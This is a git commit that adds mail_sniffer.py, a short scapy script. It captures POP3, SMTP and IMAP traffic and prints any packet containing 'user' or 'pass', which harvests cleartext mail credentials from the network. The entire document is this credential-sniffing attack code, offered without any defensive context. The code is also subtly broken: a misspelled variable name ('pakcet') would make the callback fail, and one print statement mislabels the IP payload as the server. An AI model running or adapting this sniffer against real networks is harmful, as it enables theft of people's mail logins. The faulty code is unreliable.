49c7b0dec90a57e6ed78b0053bbe58650bd011a7
Michael Wittner <mike@togethercard.org>
2020-05-11 22:56:33 -0400

    Added mail_sniffer

---
+++ mail_sniffer.py
@@ -0,0 +1,13 @@
+from scapy.all import *
+
+def packet_callback(packet):
+    if pakcet[TCP].payload:
+        mail_packet = str(packet[TCP].payload)
+
+        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+            print("[*] Server: %s" % packet[IP].payload)
+            print("[*] %s" % packet[TCP].payload)
+    print(packet.show())
+    
+sniff(prn=packet_callback, store=0, filter="tcp port 110 or tcp port 25 or tcp port 143")
+    
